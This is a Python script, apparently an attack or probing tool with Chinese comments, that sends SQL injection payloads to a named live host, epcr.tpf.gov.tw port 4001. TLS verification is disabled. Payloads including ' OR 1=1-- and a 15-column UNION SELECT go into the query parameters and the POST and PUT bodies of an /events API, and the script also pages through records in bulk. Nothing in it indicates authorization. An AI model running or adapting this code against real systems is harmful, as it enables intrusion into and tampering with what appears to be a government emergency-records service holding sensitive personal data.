import http.client
import json
import ssl
from urllib.parse import quote

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

# 测试 4001 /events 的 SQL 注入
print('=== 4001 /events SQL 注入测试 ===')

# 1. 测试 CaseID 参数
print('1. GET /events?CaseID=1%27%20OR%201%3D1--')
conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4001, timeout=5, context=ctx)
url = "/events?CaseID=" + quote("1' OR 1=1--")
conn.request('GET', url)
resp = conn.getresponse()
data = resp.read().decode('utf-8', errors='replace')
print(f'  Status: {resp.status} ({len(data)} bytes)')
print(f'  Body: {data[:200]}')
conn.close()

# 2. 测试 CaseID 参数
print('2. GET /events?CaseID=180717152801fed7%27%20UNION%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15--')
conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4001, timeout=5, context=ctx)
url = "/events?CaseID=" + quote("180717152801fed7' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--")
conn.request('GET', url)
resp = conn.getresponse()
data = resp.read().decode('utf-8', errors='replace')
print(f'  Status: {resp.status} ({len(data)} bytes)')
print(f'  Body: {data[:300]}')
conn.close()

# 3. 测试 recordUuid 参数
print('3. GET /events?recordUuid=test%27%20OR%201%3D1--')
conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4001, timeout=5, context=ctx)
url = "/events?recordUuid=" + quote("test' OR 1=1--")
conn.request('GET', url)
resp = conn.getresponse()
data = resp.read().decode('utf-8', errors='replace')
print(f'  Status: {resp.status} ({len(data)} bytes)')
print(f'  Body: {data[:200]}')
conn.close()

# 4. 测试 POST /events 的 CaseID
print('4. POST /events with SQLi in CaseID')
conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4001, timeout=5, context=ctx)
headers = {'Content-Type': 'application/json'}
body = json.dumps({
    'CaseID': "test' OR 1=1--",
    'TypeOfEventTxt': 'TestSQLi'
})
conn.request('POST', '/events', body=body, headers=headers)
resp = conn.getresponse()
data = resp.read().decode('utf-8', errors='replace')
print(f'  Status: {resp.status}')
print(f'  Body: {data[:300]}')
conn.close()

# 5. 测试 POST /events 的 TypeOfEventTxt
print('5. POST /events with SQLi in TypeOfEventTxt')
conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4001, timeout=5, context=ctx)
headers = {'Content-Type': 'application/json'}
body = json.dumps({
    'CaseID': 'test-sqli',
    'TypeOfEventTxt': "Test' OR 1=1--"
})
conn.request('POST', '/events', body=body, headers=headers)
resp = conn.getresponse()
data = resp.read().decode('utf-8', errors='replace')
print(f'  Status: {resp.status}')
print(f'  Body: {data[:300]}')
conn.close()

# 6. 测试 PUT /events/1 的字段
print('6. PUT /events/1 with SQLi in Caption')
conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4001, timeout=5, context=ctx)
headers = {'Content-Type': 'application/json'}
body = json.dumps({
    'Caption': "Test' OR 1=1--"
})
conn.request('PUT', '/events/1', body=body, headers=headers)
resp = conn.getresponse()
data = resp.read().decode('utf-8', errors='replace')
print(f'  Status: {resp.status}')
print(f'  Body: {data[:300]}')
conn.close()

# 7. 测试不同的 limit 参数
print('7. GET /events?limit=1000')
conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4001, timeout=5, context=ctx)
conn.request('GET', '/events?limit=1000')
resp = conn.getresponse()
data = resp.read().decode('utf-8', errors='replace')
print(f'  Status: {resp.status} ({len(data)} bytes)')
print(f'  Content-Range: {resp.getheader("Content-Range")}')
conn.close()

# 8. 测试 offset 参数
print('8. GET /events?offset=100')
conn = http.client.HTTPSConnection('epcr.tpf.gov.tw', 4001, timeout=5, context=ctx)
conn.request('GET', '/events?offset=100')
resp = conn.getresponse()
data = resp.read().decode('utf-8', errors='replace')
print(f'  Status: {resp.status} ({len(data)} bytes)')
print(f'  Content-Range: {resp.getheader("Content-Range")}')
print(f'  Body: {data[:200]}')
conn.close()
